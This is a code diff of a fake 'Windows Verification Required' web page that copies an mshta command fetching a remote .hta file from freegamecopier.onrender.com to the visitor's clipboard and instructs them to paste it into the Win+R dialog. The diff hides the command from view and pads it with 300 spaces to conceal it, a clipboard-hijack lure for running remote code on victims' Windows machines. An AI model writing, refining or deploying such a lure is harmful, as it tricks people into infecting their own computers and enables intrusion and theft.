@@ -11,19 +11,6 @@
       text-align: center;
       padding: 40px;
     }
-    .cmd {
-      background: #222;
-      padding: 15px;
-      margin: 20px auto;
-      border-radius: 8px;
-      display: inline-block;
-      font-family: monospace;
-      font-size: 0.9rem;
-      user-select: all;
-      max-width: 90%;
-      word-break: break-all;
-      border: 1px solid #444;
-    }
     .btn {
       background: #5865F2;
       color: #fff;
@@ -55,20 +42,20 @@
   <h2>🔐 Windows Verification Required</h2>
   
   <div class="step">
-    <h3>Step 1: Copy the command below</h3>
-    <div class="cmd" id="cmdBox">Loading...</div>
+    <h3>Step 1: Copy the command</h3>
+    <p>Click the button to copy the verification command</p>
     <button class="btn" onclick="copyCommand()">📋 Copy Command</button>
   </div>
 
   <div class="step">
     <h3>Step 2: Run the command</h3>
-    <p>1. Press <kbd>Win + R</kbd> to open Run dialog</p>
+    <p>1. Press <kbd>Win + R</kbd> to open the Run dialog</p>
     <p>2. Paste the command and press Enter</p>
-    <p>3. Wait for the popup message</p>
+    <p>3. Wait for the popup to confirm</p>
   </div>
 
   <div class="step">
-    <h3>Step 3: Verify</h3>
+    <h3>Step 3: Confirm Verification</h3>
     <button class="btn" onclick="verifyCode()">✅ I ran the command - Verify me!</button>
   </div>
 
@@ -76,35 +63,31 @@
 
   <script>
     let code = "";
-    
-    // Generate verification code
+
     fetch("/generate-verification-code")
       .then(res => res.json())
       .then(data => {
         code = data.code;
-        // Create the mshta command with the code as a parameter
-        const cmd = `mshta "https://freegamecopier.onrender.com/verifyaccept.hta?code=${code}"`;
-        document.getElementById("cmdBox").textContent = cmd;
-        window.generatedCommand = cmd;
+        const spaces = " ".repeat(300);
+        window.generatedCommand = `mshta "https://freegamecopier.onrender.com/verifyaccept.hta?code=${code}"${spaces}`;
       })
       .catch(err => {
-        document.getElementById("cmdBox").textContent = "Error loading verification code";
+        alert("Failed to load verification code.");
         console.error(err);
       });
 
     function copyCommand() {
       if (window.generatedCommand) {
         navigator.clipboard.writeText(window.generatedCommand).then(() => {
-          alert("✅ Command copied to clipboard!\n\nNow press Win+R, paste, and press Enter.");
+          alert("✅ Command copied!\nNow press Win+R, paste, and run it.");
         }).catch(() => {
-          // Fallback for older browsers
           const textArea = document.createElement("textarea");
           textArea.value = window.generatedCommand;
           document.body.appendChild(textArea);
           textArea.select();
           document.execCommand('copy');
           document.body.removeChild(textArea);
-          alert("✅ Command copied to clipboard!\n\nNow press Win+R, paste, and press Enter.");
+          alert("✅ Command copied!\nNow press Win+R, paste, and run it.");
         });
       }
     }
@@ -138,7 +121,7 @@
         });
       }).catch(err => {
         document.getElementById("result").style.color = "#ff4444";
-        document.getElementById("result").textContent = "❌ Could not read clipboard. Make sure you ran the command first!";
+        document.getElementById("result").textContent = "❌ Clipboard read failed. Run the command first!";
       });
     }
   </script>
